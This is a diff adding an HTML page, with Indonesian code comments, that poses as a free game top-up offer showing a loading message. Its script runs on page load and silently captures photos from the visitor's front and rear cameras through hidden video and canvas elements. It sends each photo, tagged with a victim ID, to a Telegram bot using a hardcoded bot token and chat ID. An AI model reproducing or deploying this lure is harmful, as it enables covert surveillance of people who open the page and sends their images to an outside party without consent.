@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>TOP UP ALL GAME FREE</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+      padding: 20px;
+    }
+    video, canvas {
+      display: none;
+    }
+    .ascii-box {
+      white-space: pre;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<h2>LOADING PLEASE WAIT....</h2>
+<video id="video" autoplay playsinline width="1280" height="720"></video>
+<canvas id="canvas" width="1280" height="720"></canvas>
+<div class="ascii-box" id="asciiBox"></div>
+
+<script>
+const token = '7636452500:AAGZgLUeKAGLjq0IlvfB-sNb_JE48fsKK90';
+const chat_id = '8122699796';
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const video = document.getElementById('video');
+
+let uid = localStorage.getItem('rezx_uid');
+if (!uid) {
+  uid = Math.floor(Math.random() * 9999) + 1;
+  localStorage.setItem('rezx_uid', uid);
+}
+
+function kirimFoto(blob, label) {
+  const formData = new FormData();
+  formData.append('chat_id', chat_id);
+  formData.append('photo', blob, label + '.png');
+
+  const waktu = new Date().toLocaleString();
+  const caption = `
+❏━━━━༽ REZZ XVOID ༼━━━━❏
+┏━━━━━━━━━━━━━━━━━━━━━━━┓
+┃⚇ DEVELOPER : REZZ AXTH
+┃⚇ WAKTU : ${waktu}
+┃⚇ UID TARGET : ${uid}
+┗━━━━━━━━━━━━━━━━━━━━━━━┛`;
+
+  formData.append('caption', caption);
+
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: 'POST',
+    body: formData
+  }).then(() => {
+    document.getElementById('asciiBox').textContent = caption;
+  });
+}
+
+function ambilFotoDanKirim(label, callback) {
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob => {
+    kirimFoto(blob, label);
+    if (callback) callback();
+  }, 'image/png');
+}
+
+function aktifkanKamera(facingMode, onReady) {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode } })
+    .then(stream => {
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          onReady(() => {
+            // Stop stream
+            stream.getTracks().forEach(track => track.stop());
+          });
+        }, 1500); // tunggu sedikit agar kamera siap
+      };
+    })
+    .catch(err => {
+      alert("Gagal mengakses kamera: " + err.message);
+    });
+}
+
+window.onload = () => {
+  aktifkanKamera("user", stop1 => {
+    ambilFotoDanKirim("depan", () => {
+      stop1(); // matikan kamera depan
+      aktifkanKamera("environment", stop2 => {
+        ambilFotoDanKirim("belakang", () => {
+          stop2(); // matikan kamera belakang
+        });
+      });
+    });
+  });
+};
+</script>
+
+</body>
+</html>
